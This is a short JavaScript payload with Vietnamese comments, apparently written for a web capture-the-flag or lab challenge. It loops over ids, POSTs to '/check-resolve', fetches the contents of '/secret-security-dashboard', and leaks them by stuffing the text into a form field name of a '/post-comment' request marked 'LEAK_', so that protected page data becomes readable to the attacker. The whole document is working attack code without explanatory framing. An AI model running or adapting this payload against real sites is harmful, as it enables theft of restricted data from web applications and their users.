(async () => {
  for (let id = 1; id <= 8; id++) {
    // 1. Gửi check resolve
    const txt = await fetch('/check-resolve', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `id=${id}`
    }).then(res => res.text());

    // 2. Lấy dashboard
    const secret = await fetch('/secret-security-dashboard').then(res => res.text());

    // 3. Gửi payload, nhét dashboard vào phần NAME của trường
    // Chúng ta sẽ tạo một trường có tên là nội dung của dashboard, giá trị là '1'
    const r = await fetch('/post-comment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      // Sử dụng encodeURIComponent cho TÊN trường để không bị lỗi ký tự đặc biệt (&, =)
      body: 'comment-author=test' + encodeURIComponent(txt) + 
            '&' + encodeURIComponent('LEAK_' + secret) + '=1'
    });
    
    console.log(`Đã gửi ID ${id}, status: ${r.status}`);
    await new Promise(r => setTimeout(r, 300)); 
  }
})();
